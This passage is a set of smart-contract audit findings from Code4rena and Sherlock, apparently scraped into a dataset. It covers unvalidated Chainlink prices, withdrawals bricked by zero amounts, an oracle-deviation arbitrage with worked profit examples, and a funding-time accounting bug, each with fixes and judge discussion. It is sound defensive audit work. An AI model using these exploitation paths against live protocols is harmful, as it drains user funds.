      "content": "\nThe current price implementation for the VotiumStrategy token uses a potentially invalid Chainlink response. This price is then used to calculate the price of AfEth and, subsequently, the amount of tokens to mint while depositing.\n\n### Impact\n\nThe price of VotiumStrategy tokens are determined by taking the amount of deposited CVX in the strategy, and multiplied by the current price of CVX in terms of ETH. This price is fetched using Chainlink in the `ethPerCvx()` function:\n\n<https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L156-L186>\n\n```solidity\n156:     function ethPerCvx(bool _validate) public view returns (uint256) {\n157:         ChainlinkResponse memory cl;\n158:         try chainlinkCvxEthFeed.latestRoundData() returns (\n159:             uint80 roundId,\n160:             int256 answer,\n161:             uint256 /* startedAt */,\n162:             uint256 updatedAt,\n163:             uint80 /* answeredInRound */\n164:         ) {\n165:             cl.success = true;\n166:             cl.roundId = roundId;\n167:             cl.answer = answer;\n168:             cl.updatedAt = updatedAt;\n169:         } catch {\n170:             cl.success = false;\n171:         }\n172:         // verify chainlink response\n173:         if (\n174:             (!_validate ||\n175:                 (cl.success == true &&\n176:                     cl.roundId != 0 &&\n177:                     cl.answer >= 0 &&\n178:                     cl.updatedAt != 0 &&\n179:                     cl.updatedAt <= block.timestamp &&\n180:                     block.timestamp - cl.updatedAt <= 25 hours))\n181:         ) {\n182:             return uint256(cl.answer);\n183:         } else {\n184:             revert ChainlinkFailed();\n185:         }\n186:     }\n```\n\nAs we can see from the previous snippet of code, if the `_validate` flag is off, then *no validation* is done, it can even return an uninitialized response from a failed call given the usage of the `try/catch` structure. This means that it can invalid price, stale price, or even zero when the call fails.\n\nThe VotiumStrategy `price()` function calls `ethPerCvx(false)`, which means it carries forward any invalid CVX/ETH price.\n\n<https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategy.sol#L31-L33>\n\n```solidity\n31:     function price() external view override returns (uint256) {\n32:         return (cvxPerVotium() * ethPerCvx(false)) / 1e18;\n33:     }\n```\n\nThe price of VotiumStrategy is then used in the AfEth contract to calculate its price and determine the amount of tokens to mint in `deposit()`\n\n<https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L133-L169>\n\n```solidity\n133:     function price() public view returns (uint256) {\n134:         if (totalSupply() == 0) return 1e18;\n135:         AbstractStrategy vEthStrategy = AbstractStrategy(vEthAddress);\n136:         uint256 safEthValueInEth = (ISafEth(SAF_ETH_ADDRESS).approxPrice(true) *\n137:             safEthBalanceMinusPending()) / 1e18;\n138:         uint256 vEthValueInEth = (vEthStrategy.price() *\n139:             vEthStrategy.balanceOf(address(this))) / 1e18;\n140:         return ((vEthValueInEth + safEthValueInEth) * 1e18) / totalSupply();\n141:     }\n\n148:     function deposit(uint256 _minout) external payable virtual {\n149:         if (pauseDeposit) revert Paused();\n150:         uint256 amount = msg.value;\n151:         uint256 priceBeforeDeposit = price();\n152:         uint256 totalValue;\n153: \n154:         AbstractStrategy vStrategy = AbstractStrategy(vEthAddress);\n155: \n156:         uint256 sValue = (amount * ratio) / 1e18;\n157:         uint256 sMinted = sValue > 0\n158:             ? ISafEth(SAF_ETH_ADDRESS).stake{value: sValue}(0)\n159:             : 0;\n160:         uint256 vValue = (amount * (1e18 - ratio)) / 1e18;\n161:         uint256 vMinted = vValue > 0 ? vStrategy.deposit{value: vValue}() : 0;\n162:         totalValue +=\n163:             (sMinted * ISafEth(SAF_ETH_ADDRESS).approxPrice(true)) +\n164:             (vMinted * vStrategy.price());\n165:         if (totalValue == 0) revert FailedToDeposit();\n166:         uint256 amountToMint = totalValue / priceBeforeDeposit;\n167:         if (amountToMint < _minout) revert BelowMinOut();\n168:         _mint(msg.sender, amountToMint);\n169:     }\n```\n\nThe VotiumStrategy price is first used in line 138 to calculate its TVL (`vEthValueInEth`). Any invalid price here will also mean an invalid price for AfEth.\n\nThen both the AfEth price (line 151) and again the VotiumStrategy price (line 164) are used in `deposit()` to calculate the number of minted tokens. Depending on the direction of the wrong price, this means that the user will be minted more or less tokens than it should.\n\n### Proof of Concept\n\nLet's suppose the Chainlink feed is stale and the current price of CVX/ETH has increased since then.\n\n1.  A user calls `deposit()` to create a new position in AfEth.\n2.  The function calculates the current price (`priceBeforeDeposit`) in order to know how many tokens should be minted.\n3.  The `price()` implementation will calculate the Votium strategy TVL using `ethPerCvx(false)`, which will successfully return the stale price.\n4.  The price of AfEth will then be calculated using the old data, which will result in a lower value than the actual \"real\" price.\n5.  The user is minted tokens based on the incorrectly calculated `priceBeforeDeposit`, since this price is lower than the expected \"real\" price the user will be minted more tokens than expected.\n\n### Recommendation\n\nChange the `ethPerCvx()` argument to `true` to make sure prices coming from Chainlink are correctly validated.\n\n```diff\n  function price() external view override returns (uint256) {\n-     return (cvxPerVotium() * ethPerCvx(false)) / 1e18;\n+     return (cvxPerVotium() * ethPerCvx(true)) / 1e18;\n  }\n```\n\n**[elmutt (Asymmetry) confirmed](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/34#issuecomment-1741423338):**\n\n**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/34#issuecomment-1744973191):**\n > Should we not be prioritising liveness here over validating chainlink results?\n>\n > It seems important to avoid using stale price data which can be readily arbitraged. Severity seems correct.\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-10-asymmetry-mitigation#mitigations-to-be-reviewed):**\n >\tValidate Chainlink price data.\n\n**Status**: Mitigation confirmed. Full details in reports from [m\\_Rassska](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/6), [d3e4](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/14), and [adriro](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/29).\n\n***\n\n",
      "summary": "\nThe current implementation of VotiumStrategy token's price calculation uses potentially incorrect data from the Chainlink response. This can result in an incorrect price for AfEth and affect the amount of tokens minted while depositing. This bug can be exploited if the Chainlink feed is stale and the current price of CVX/ETH has increased since then. To fix this, the `ethPerCvx()` argument should be changed to `true` to ensure that prices from Chainlink are correctly validated. The team has confirmed the issue and has implemented a mitigation to validate Chainlink price data. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-09-asymmetry-findings/issues/34",
      "tags": [],
      "finders": [
        "adriro",
        "d3e4",
        "rvierdiiev",
        "MiloTruck"
      ]
    },
    {
      "id": "29985",
      "title": "[H-02] Zero amount withdrawals of SafEth or Votium will brick the withdraw process",
      "impact": "HIGH",
      "content": "\nWithdrawals of amount zero from both SafEth and VotiumStrategy have issues downstream that will cause the transaction to revert, potentially bricking withdrawals from being executed.\n\n### Impact\n\nWithdrawals in AfEth undergo a process to account for any potential delay when withdrawing locked tokens in the VotiumStrategy. When a withdrawal is requested, the implementation calculates the owed amounts for each token and queues the withdrawal. SafEth tokens will be reserved in the contract, and VotiumStrategy will also queue the withdrawal of CVX tokens.\n\nWhen the time arrives, the user can call `withdraw()` to execute the withdrawal. This function will unstake from SafEth and withdraw from VotiumStrategy.\n\n<https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L252-L253>\n\n```solidity\n252:         ISafEth(SAF_ETH_ADDRESS).unstake(withdrawInfo.safEthWithdrawAmount, 0);\n253:         AbstractStrategy(vEthAddress).withdraw(withdrawInfo.vEthWithdrawId);\n```\n\nLet's first consider the SafEth case. The current `unstake()` implementation in SafEth will revert if the unstaked amount is zero:\n\n<https://etherscan.io/address/0x591c4abf20f61a8b0ee06a5a2d2d2337241fe970#code#F1#L124>\n\n```solidity\n119:     function unstake(\n120:         uint256 _safEthAmount,\n121:         uint256 _minOut\n122:     ) external nonReentrant {\n123:         if (pauseUnstaking) revert UnstakingPausedError();\n124:         if (_safEthAmount == 0) revert AmountTooLow();\n125:         if (_safEthAmount > balanceOf(msg.sender)) revert InsufficientBalance();\n```\n\nAs we can see in line 124, if `_safEthAmount` is zero the function will revert, and the transaction to `withdraw()` will revert too due to the bubbled error. This means that any withdrawal that ends up with a zero amount for SafEth will be bricked.\n\nThe VotiumStrategy case has a similar issue. The implementation of `withdraw()` will call `sellCvx()` to swap the owed amount of CVX for ETH. This is executed using a Curve pool, as we can see in the following snippet of code:\n\n```solidity\n250:     function sellCvx(\n251:         uint256 _cvxAmountIn\n252:     ) internal returns (uint256 ethAmountOut) {\n253:         address CVX_ETH_CRV_POOL_ADDRESS = 0xB576491F1E6e5E62f1d8F26062Ee822B40B0E0d4;\n254:         // cvx -> eth\n255:         uint256 ethBalanceBefore = address(this).balance;\n256:         IERC20(CVX_ADDRESS).approve(CVX_ETH_CRV_POOL_ADDRESS, _cvxAmountIn);\n257: \n258:         ICrvEthPool(CVX_ETH_CRV_POOL_ADDRESS).exchange_underlying(\n259:             1,\n260:             0,\n261:             _cvxAmountIn,\n262:             0 // this is handled at the afEth level\n263:         );\n264:         ethAmountOut = address(this).balance - ethBalanceBefore;\n265:     }\n```\n\nIf we drill down in the Curve implementation, we can see that it validates that the input amount is greater than zero:\n\n<https://etherscan.io/address/0xB576491F1E6e5E62f1d8F26062Ee822B40B0E0d4#code#L714>\n\n```vyper\n709: def _exchange(sender: address, mvalue: uint256, i: uint256, j: uint256, dx: uint256, min_dy: uint256, use_eth: bool) -> uint256:\n710:     assert not self.is_killed  # dev: the pool is killed\n711:     assert i != j  # dev: coin index out of range\n712:     assert i < N_COINS  # dev: coin index out of range\n713:     assert j < N_COINS  # dev: coin index out of range\n714:     assert dx > 0  # dev: do not exchange 0 coins\n```\n\nAgain, this means that any withdrawal that ends up with a zero amount of vAfEth tokens (or the associated amount of CVX tokens) will be bricked when trying to execute the swap.\n\nThis can happen for different reasons. For example the current `ratio` may be `0` or `1e18`, meaning the split goes entirely to SafEth or to VotiumStrategy. Another reason could be rounding, for small quantities the proportion may round down values to zero.\n\nThe critical issue is that both withdrawals are executed simultaneously. A zero amount shouldn't matter, but both happen at the time, and one may affect the other. If the SafEth amount is zero, it will brick the withdrawal for a potentially non-zero vAfEth amount. Similarly, if the vAfEth amount is zero, it will brick the withdrawal for a potentially non-zero SafEth amount\n\n### Proof of Concept\n\nTo simplify the case, let's say the current ratio is zero, meaning all goes to VotiumStrategy.\n\n1.  A user calls `requestWithdraw()`. Since currently the SafEth ratio is zero, the contract doesn't hold a position in SafEth. This means that `safEthWithdrawAmount = 0`, and the position is entirely in vAfEth (`votiumWithdrawAmount > 0`).\n2.  Time passes and the user can finally withdraw.\n3.  The user calls `withdraw()`. The implementation will try to call `SafEth::unstake(0)`, which will cause an error, reverting the whole transaction.\n4.  The user will never be able to call `withdraw()`. Even if the ratios are changed, the calculated amount will be already stored in the `withdrawIdInfo` mapping. The withdrawal will be bricked, causing the loss of the vAfEth tokens.\n\n### Recommendation\n\nFor SafEth, avoid calling `SafEth::unstake()` if the calculated amount is zero:\n\n```diff\n+ if (withdrawInfo.safEthWithdrawAmount > 0) {\n    ISafEth(SAF_ETH_ADDRESS).unstake(withdrawInfo.safEthWithdrawAmount, 0);\n+ }\n```\n\nFor VotiumStrategy, prevent requesting the withdrawal if `votiumWithdrawAmount` is zero, while also keeping track of this to also avoid executing the withdrawal when `AfEth::withdraw()` is called.\n\nIt is also recommended to add a guard in `VotiumStrategy::withdraw()` to avoid calling `sellCvx()` when `cvxWithdrawAmount = 0`.\n\n```diff\n-  uint256 ethReceived = sellCvx(cvxWithdrawAmount);\n+  uint256 ethReceived = cvxWithdrawAmount > 0 ? sellCvx(cvxWithdrawAmount) : 0;\n```\n\n**[elmutt (Asymmetry) confirmed](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/36#issuecomment-1741290306)**\n\n**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/36#issuecomment-1746294920):**\n > It's unclear under what circumstances, `withdrawRatio` will be zero. As it appears, `votiumWithdrawAmount` is calculated as `(withdrawRatio * votiumBalance) / 1e18` and similarly, `safEthWithdrawAmount` is calculated as `(withdrawRatio * safEthBalance) / 1e18`. So it seems the withdraw ratio is applied in the same manner to both of these amounts?\n>\n > The main case where this causes issues is when `votiumBalance` is non-zero and `safEthBalance` is zero or vice-versa. I'm curious as to when this might happen @elmutt ?\n\n**[elmutt (Asymmetry) commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/36#issuecomment-1746906671):**\n> withdrawRatio represents the ratio of the amount being withdrawn to the total supply. So if a user owns 1% of afEth and withdraws their entire balance they will be set to receive 1% of each of the underlying assets (safEth & votiumStrategy) based on their current prices.\n> \n> It should never be zero unless user is withdrawing the the last afEth from the system but we plan to solve this with an initial seed deposit\n\n**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/36#issuecomment-1747441726):**\n > Okay good to know, I think I understand what you mean now. Issue appears valid and I think high severity is justified because the last staker would be unable to execute their withdrawal. \n>\n > However, can you explain why `withdrawRatio` would be zero upon the last withdrawal? It is calculated as `(_amount * 1e18) / (totalSupply() - afEthBalance)` where the denominator is equal to the `_amount`. Hence, this is equal to `1e18`. So it attempts to withdraw all votium and safEth tokens from the contract.\n> \n> A better thing to understand would be, when would either of this token balances be non-zero? And your mitigation is to seed the contract with some tokens initially so the token balance is always positive?\n\n**[elmutt (Asymmetry) commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/36#issuecomment-1748055065):**\n > I think we actually have a bug here. We shouldnt be subtracting afEthBalance. \n> \n> Previously we subtracted it because the afEth contract held the users afEth before finally burning it on withdraw(). Now we just burn it on requestWithdraw() so we shouldn't be subtracting anymore.\n> \n> Does that make sense?\n\n**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/36#issuecomment-1748226123):**\n > Agreed, that makes sense. No need to track `afEthBalance` anymore. There might be other areas where this is being done incorrectly too.\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-10-asymmetry-mitigation#mitigations-to-be-reviewed):**\n > Don't withdraw zero from SafEth or Votium.\n\n**Status**: Mitigation confirmed. Full details in reports from [m\\_Rassska](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/5) and [adriro](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/28).\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the withdrawal process for two tokens, SafEth and VotiumStrategy, which may cause the transaction to fail and prevent withdrawals from being executed. This issue occurs when the withdrawal amount for either token is zero, which can happen due to rounding or other factors. The report suggests adding safeguards to prevent withdrawals of zero amounts and recommends changes to the code to address this issue. After further discussion and review, the bug was confirmed and a mitigation was implemented. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-09-asymmetry-findings/issues/36",
      "tags": [],
      "finders": [
        "adriro",
        "d3e4",
        "rvierdiiev"
      ]
    },
    {
      "id": "29984",
      "title": "[H-01] Intrinsic arbitrage from price discrepancy",
      "impact": "HIGH",
      "content": "\nThe up to 2 % price discrepancy from Chainlink creates an intrinsic arbitrage. Especially, it makes withdrawals worth more than deposits in the sense that one can immediately withdraw more than just deposited.\n\n### Proof of Concept\n\nWhen [depositing ETH into AfEth](https://github.com/code-423n4/2023-09-asymmetry/blob/6b4867491350f8327d0ac4f496f263642cf3c1be/contracts/AfEth.sol#L148-L169), the ETH is split according to `ratio` and sold for safEth and vAfEth. The received share of afEth is then determined by the value in ETH of the resulting amounts of safEth and vAfEth. Note that there are two prices involved here: the true price at which ETH is traded for safEth and vAfEth (in `sellCvx()` and `buyCvx()`), and the estimated value in ETH that safEth and vAfEth is considered to have (`ISafEth.approxPrice()` and `VotiumStrategy.price()`). These are not necessarily the same.\n\nIf the ratio by which the deposited ETH is split is not the same as the ratio of the true values of the underlying assets, this implies that a deposit implicitly makes a trade between safEth and vAfEth according to the estimated price which may thus differ from the true price obtained when withdrawing. This presents an arbitrage opportunity.\nNote that if all prices were the same it would not matter if safEth is \"traded\" for vAfEth within a deposit as the trade then makes no change in the total value deposited.\n\nThe conditions for this issue is thus that `VotiumStrategy.price()` is different from the price obtained by `sellCvx()` and `buyCvx()`, and that the deposit ratio is not the same as the withdrawal ratio.\n\n[`VotiumStrategy.price()`](https://github.com/code-423n4/2023-09-asymmetry/blob/6b4867491350f8327d0ac4f496f263642cf3c1be/contracts/strategies/votium/VotiumStrategy.sol#L31-L33) in particular is [based on a Chainlink oracle](https://github.com/code-423n4/2023-09-asymmetry/blob/6b4867491350f8327d0ac4f496f263642cf3c1be/contracts/strategies/votium/VotiumStrategyCore.sol#L156-L186) with a [2 % deviation threshold](https://data.chain.link/ethereum/mainnet/crypto-eth/cvx-eth), which means that the true price is allowed to deviate up to 2 %, within 24 hours, from the reported price. `ISafEth.approxPrice()` may perhaps be similarly inaccurate (I have not looked into this).\n\nThe ratio can skew in this way for two reasons. One is when the `ratio` is different from the ratio of the underlying balances, such as when `ratio` is changed. Deposits are made according to `ratio` but withdrawals are made proportionally from the extant balances. In this case the implicit trade between safEth and vAfEth can happen in either direction, either beneficial or detrimental to the depositor (if there is a price discrepancy).\nThe other is caused by the price discrepancy itself when depositing. In this case it is always beneficial to the depositor (and detrimental to the holders).\n\n**Example 1a - reconverging ratio, vAfEth is actually more expensive**\nSuppose the contract holds 100 safEth and 0 vAfEth, but that the `ratio` has now been changed to 0. Further suppose that the contract thinks all prices are 1, but that 100 ETH actually trades for 102 vAfEth.\nThen depositing 100 ETH will convert it to 102 vAfEth, which will be valued as 102 ETH. This mints 102 afEth.\nThe balances are now 100 safEth and 102 vAfEth and the total supply is 202 afEth.\nWithdrawing 102 afEth converts 102/202 of the underlying, i.e. 50.495 safEth and 51.505 vAfEth, into 50.495 + 51.505/1.02 = 100.99 ETH.\n\n**Example 1b - reconverging ratio, vAfEth is actually cheaper**\nSuppose the contract holds 100 safEth and 0 vAfEth, but that the `ratio` has now been changed to 0. Further suppose that the contract thinks all prices are 1, but that 100 ETH actually trades for 98 vAfEth.\nThen depositing 100 ETH will convert it to 98 vAfEth, which will be valued as 98 ETH. This mints 98 afEth.\nThe balances are now 100 safEth and 98 vAfEth and the total supply is 198 afEth.\nWithdrawing 98 afEth converts 98/198 of the underlying, i.e. 49.495 safEth and 48.505 vAfEth, into 49.495 + 48.505/0.98 = 98.99 ETH.\n\n**Example 2a - stable ratio, vAfEth is actually more expensive**\nSuppose the contract holds 50 safEth and 50 vAfEth and that the `ratio` is 0.5. Further suppose that the contract thinks all prices are 1 but that 50 ETH actually trades for 51 vAfEth.\nThen depositing 100 ETH will convert 50 ETH to 50 safEth and 50 ETH to 51 vAfEth, which will be valued as 101 ETH. This mints 101 afEth.\nThe balances are now 100 safEth and 101 vAfEth and the total supply is 201 afEth.\nWithdrawing 101 afEth converts 101/201 of the underlying, i.e. 50.249 safEth and 50.751 vAfEth, into 50.249 + 50.751/1.02 = 100.005 ETH.\n\n**Example 2b - stable ratio, vAfEth is actually cheaper**\nSuppose the contract holds 50 safEth and 50 vAfEth and that the `ratio` is 0.5. Further suppose that the contract thinks all prices are 1 but that 50 ETH actually trades for 49 vAfEth.\nThen depositing 100 ETH will convert 50 ETH to 50 safEth and 50 ETH to 49 vAfEth, which will be valued as 99 ETH. This mints 99 afEth.\nThe balances are now 100 safEth and 99 vAfEth and the total supply is 199 afEth.\nWithdrawing 99 afEth converts 99/199 of the underlying, i.e. 49.749 safEth and 49.251 vAfEth, into 49.749 + 49.251/0.98 = 100.005 ETH.\n\nThus one can make a profit by depositing and immediately withdrawing. Immediate withdrawals are possible at the moment locks expire (and before they have been relocked), but it may be enough to just immediately request a withdrawal if the true price is the same (or better) when eventually withdrawn.\n\nThe price discrepancy will appear whenever there are price fluctuations of up to 2 % within 24 hours, which seems quite likely.\n\nRegarding the case where the underlying is reconverging after a change of `ratio` it is worth noting that convergence is quite slow. Several times the entire balances must be traded before the new ratio is approached.\n\n### Recommended Mitigation Steps\nWe want a  to not diminish the value of previous deposits. That is, withdrawing $w$ shares should return at least as much if withdrawn after a deposit which mints $m$ shares as if withdrawn before.\n\nNote that letting a share represent each underlying in equal proportions is the only way to guarantee fairness and fungibility, so we must leave the withdrawal calculation as it is.\n \nLet $d_s$ and $d_v$ be the ether amounts deposited in SafEth and VotiumStrategy, respectively. Let $B_s$ and $B_v$ be the respective balances in AfEth and $T$ the total supply of afEth. Let $P_s(x)$ be the amount of safEth obtained by selling $x$ ether for safEth, and $P_s^{-1}(y)$ the amount of ether obtained by selling safEth for ether (note the abuse of notation and that $P_s^{-1}(P_s(x)) \\leq x$ because of fees, spread, slippage etc.), and similarly $P_v$ and $P_v^{-1}$ for vAfEth.\n\nWithdrawing $w$ now should return at most what it would return after a deposit of $d_s + d_v$, i.e.\n \n```math\nP_s^{-1}(\\frac{w}{T}B_s) + P_v^{-1}(\\frac{w}{T}B_v) \\leq \nP_s^{-1}(\\frac{w}{T+m}(B_s + P_s(d_s))) + P_v^{-1}(\\frac{w}{T+m}(B_v + P_v(d_v)))\n```\n\nFor small deposits and withdrawals the price functions are approximately linear and we can write e.g. $P_s(d_s)$ as $P_s d_s$, i.e. $P_s$ is just a price point, and we get\n```math\n\\frac{1}{T}(P_s^{-1}B_s + P_v^{-1}B_v) \\leq \n\\frac{1}{T+m}(P_s^{-1}(B_s + P_s d_s) + P_v^{-1}(B_v + P_v d_v))$\n```\n\nSolving for $m$ we get\n```math\nm \\leq \\frac{P_s^{-1}P_s d_s + P_v^{-1}P_v d_v}{P_s^{-1}B_s + P_v^{-1}B_v}T\n```\n\nThe difference from the current implementation is that instead of the true prices $P_s^{-1}$ and $P_v^{-1}$, the oracle prices, which we will denote $\\hat{P}^{-1}_s$ and $\\hat{P}^{-1}_v$, are used instead, i.e.\n```math\nm = \\frac{\\hat{P}^{-1}_s P_s d_s + \\hat{P}^{-1}_v P_v d_v}\n{\\hat{P}^{-1}_s B_s + \\hat{P}^{-1}_v B_v}T\n```\n\nSince we know the true prices up to within certain bounds, we can minimise $m$, as a function of $P_s^{-1}$ and $P_v^{-1}$, within these bounds.\nThe gradient of $m(P_s^{-1}, P_v^{-1})$ is\n```math\n\\frac{P_s d_s B_v - P_v d_v B_s}\n{(P^{-1}_s B_s + P^{-1}_v B_v)^2}\n(P^{-1}_v, -P^{-1}_s)\n```\n\nso if $P_s d_s B_v - P_v d_v B_s > 0$ we pick the lower right corner (maximal $P_s^{-1}$, minimal $P_v^{-1}$), and if $P_s d_s B_v - P_v d_v B_s < 0$ we pick the upper left corner (minimal $P_s^{-1}$, maximal $P_v^{-1}$).\nIn the case of equality we can use any (non-zero) prices.\n\nWe minimise within the bounds, but we of course want the bounds to be as tight as possible, so that this minimum is as high as possible.\n\nThe oracle prices provide us with good bounds, namely $P_s^{-1} \\in [0.98 \\cdot \\hat{P}^{-1}_s, 1.02 \\cdot \\hat{P}^{-1}_s]$ and $P_v^{-1} \\in [0.98 \\cdot \\hat{P}^{-1}_v, 1.02 \\cdot \\hat{P}^{-1}_v]$.\n\nThere are a few ways to further improve the bounds. During the deposit we learn $P_s$ and $P_v$, from which we can infer $P_s^{-1} \\leq 1/P_s$ and $P_v^{-1} \\leq 1/P_v$ (equality in the case of no exchange losses). If we know that there is some minimum percentage lost (e.g. exchange fees, slippage, spread) we can refine these to $P_s^{-1} \\leq k_s/P_s$ and $P_v^{-1} \\leq k_v/P_v$, where $k_s, k_v < 1$ is some factor adjusting for these losses (e.g. $k_s = 0.99$ if there is at least (another) 1 \\% lost when selling for ether).\n\nIf the trading losses are significant it may be necessary to take these into account even for the bounds from the oracle prices, such that both upper and lower bounds are slightly reduced.\n\n**[elmutt (Asymmetry) confirmed](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/62#issuecomment-1746998418)**\n\n**[adriro (Warden) commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/62#issuecomment-1752039853):**\n > @0xleastwood - I'm really sorry to do this at this stage, but did you have the chance to go through these scenarios? Seems there are lot of suppositions, some of which the same warden is confusingly invalidating in other discussions.\n> \n> I think examples 1a and 1b have invalid assumptions (\"the contract holds 100 safEth and 0 vAfEth, but that the ratio has now been changed to 0\"). In 2a and 2b, what is \"the contract thinks all prices are..\"? How is the contract thinking prices?\n> \n> It seems this has nothing to do with the stated impact. The chainlink response is used to price vAfEth, but the core here is a discrepancy of the ratio with the underlying assets (which again confusingly the author is trying to invalidate in other issues). Furthermore the deposit/withdraw cycle can't be executed without exposure to the underlying assets due to the locking mechanism.\n\n**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/62#issuecomment-1752158668):**\n> @adriro - I'll look into these, I do believe it is possible to deposit and withdraw atomically as long as there is an unlocked amount of tokens in the votium strategy contract. That would be the extent at which a withdrawal could be made \"instantly\".\n>\n> I do agree that example 1a and 1b are somewhat infeasible because the protocol team has already stated that such a ratio would not exist in the first place. However, there is validity in the other examples.\n\n**[Asymmetry commented](https://github.com/code-423n4/2023-10-asymmetry-mitigation?tab=readme-ov-file#individual-prs):**\n > After days of research we decided that this was acceptable. See the comments in [issue 62](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/62#issuecomment-1760305328) for more information.\n\n**Status**: Unmitigated. Full details in reports from adriro ([1](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/26), [2](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/45)) and [d3e4](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/12), and also included in the [Mitigation Review](#mitigation-review) section below.\n\n***\n\n",
      "summary": "\nThis report discusses a potential issue with the AfEth smart contract, where the price of ETH may differ from the estimated price used for trades within the contract. This could result in an arbitrage opportunity for users, where they can deposit ETH and immediately withdraw more than they deposited. The issue is caused by a discrepancy in the ratio used for deposits and withdrawals, and the true values of the underlying assets. This can occur due to fluctuations in the price of ETH within a 24-hour period. The recommended mitigation steps involve using the oracle prices to set tighter bounds for the ratio and taking into account trading losses. However, this issue has not been mitigated yet and is still present in the contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-09-asymmetry-findings/issues/62",
      "tags": [],
      "finders": [
        "d3e4"
      ]
    },
    {
      "id": "20698",
      "title": "M-13: Potential accounting problems due to issue in `ClearingHouse.updatePositions()`",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/248 \n\n## Found by \nlemonmon\n## Summary\n\nPotential issue in `ClearingHouse.updatePositions()` when lastFundingTime is not being updated by `ClearingHouse.settleFunding`.\n\n## Vulnerability Detail\n\n`ClearingHouse.lastFundingTime` is only updated, when `_nextFundingTime` is not zero:\n\nhttps://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/ClearingHouse.sol#L281-L282\n\n`_nextFundingTime` is determined a few lines above by a call to `amms[i].settleFunding()`:\n\nhttps://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/ClearingHouse.sol#L267\n\nThe return value of `amms[i].settleFunding()` can be zero for `_nextFundingTime`, if the `block.timestamp` is smaller than the next funding time:\n\nhttps://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/AMM.sol#L236-L249\n\nThat means that if the last market inside the `amms` array has not reached the next funding time at `block.timestamp`, `_nextFundingTime` will be zero and `lastFundingTime` will not be updated.\n\nThen when `ClearingHouse.updatePositions()` is called, it will not process `fundingPayment` because `lastFundingTime` was not updated:\n\nhttps://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/ClearingHouse.sol#L241-L250\n\n## Impact\n\nUnrealized funding payments are not settled correctly, potentially leading to incorrect margin accounting when opening a position. Also `marginAccount.realizePnL()` (line 255 ClearingHouse.sol) won't get called, so the trader won't receive funds that they should receive.\n\nNote: `ClearingHouse.updatePositions()` is called by `ClearingHouse._openPosition` (line 141 ClearingHouse.sol).\n\nNote: `ClearingHouse.liquidate` -> `ClearingHouse.openPosition` -> `ClearingHouse._openPosition`\n\nThere can be multiple potential issues with accounting that can result due to this issue, both when liquidating and when opening a position.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/ClearingHouse.sol#L281-L282\n\nhttps://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/ClearingHouse.sol#L267\n\nhttps://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/AMM.sol#L236-L249\n\nhttps://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/ClearingHouse.sol#L241-L250\n\nhttps://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/ClearingHouse.sol#L140-L141\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider adjusting the code inside `ClearingHouse.settleFunding()` to account for the case where the last market inside the `amms` array returns zero for `_nextFundingTime` when `Amm.settleFunding()` is called (line 267 ClearingHouse.sol). For example introduce a boolean variable that tracks whether a market inside `amms` array didn't return zero for `_nextFundingTime`.\n\n```solidity\n// ClearingHouse\n// settleFunding\n268            if (_nextFundingTime != 0) {\n269                _marketReachedNextFundingTime = true; // <-- @audit new boolean to track\n\n281        if (_marketReachedNextFundingTime) {\n282            lastFundingTime = _blockTimestamp();\n283        }\n```\n\n\n\n## Discussion\n\n**asquare08**\n\nAll amms will have the same 